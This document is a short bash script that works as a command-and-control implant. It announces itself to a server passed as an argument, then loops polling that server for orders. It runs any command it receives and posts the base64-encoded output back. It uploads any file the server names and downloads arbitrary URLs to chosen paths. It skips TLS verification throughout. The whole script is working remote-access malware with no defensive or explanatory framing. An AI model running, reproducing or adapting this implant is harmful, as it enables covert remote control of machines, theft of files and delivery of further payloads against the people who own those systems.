#Hello
curl -sk "$2/res.php?res=$(echo -n "Hello from Agent $1 (Linux)" | base64)&id=$1" > /dev/null
while true
do
#grab 'n' run, skip if empty
cmds=$(curl -sk $2/cmds.php?id=$1\&o=L)
act=$(echo $cmds | grep $1 | cut -f 2 -d ":")

if [[ $act == "run" ]];
then
run=$(echo $cmds | grep $1 | cut -f 3- -d ":")

if [ -z "$run" ];
then 
sleep 10
continue
fi

res=$($run 2>&1| base64 | tr -d '\n')
#send result
curl -sk -X POST $2/res.php -d "res=$(echo $res)&id=$1" > /dev/null
sleep 10

elif [[ $act == "download" ]];
then
file=$(echo $cmds | grep $1 | cut -f 3- -d ":")
curl -sk -X POST $2/res.php -d "res=$(echo -n "Uploading $file" | base64)&id=$1" > /dev/null
curl -sk -F data=@$(echo -n $file) $2/up.php?id=$1
sleep 10


elif [[ $act == "upload" ]];
then
url=$(echo $cmds | grep $1 | cut -f 3,4 -d ":")
echo $url
path=$(echo $cmds | grep $1 | cut -f 5- -d ":")
echo $path
curl -sk -X POST $2/res.php -d "res=$(echo -n "Downloading $url to $path" | base64)&id=$1" > /dev/null
curl -sk  $url > $path
sleep 10
fi

sleep 10
done
